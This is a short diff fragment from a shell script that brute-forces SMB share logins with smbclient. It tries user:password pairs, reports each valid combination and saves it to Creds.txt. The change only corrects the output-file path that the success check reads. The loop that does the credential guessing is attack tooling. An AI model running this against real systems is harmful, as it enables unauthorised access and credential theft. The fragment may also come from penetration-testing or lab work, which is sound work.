@@ -14,7 +14,7 @@ while read pass; do
  
     smbclient -U $user%$pass \\\\$1\\$2 1> /dev/shm/out.txt 2> /dev/shm/err.txt
  
-    if grep -q help /tmp/out.txt; then
+    if grep -q help /dev/shm/out.txt; then
  
         echo -e "${GREEN}[+] Valid Combination Found :- $user:$pass"
         echo "$user:$pass" >> Creds.txt
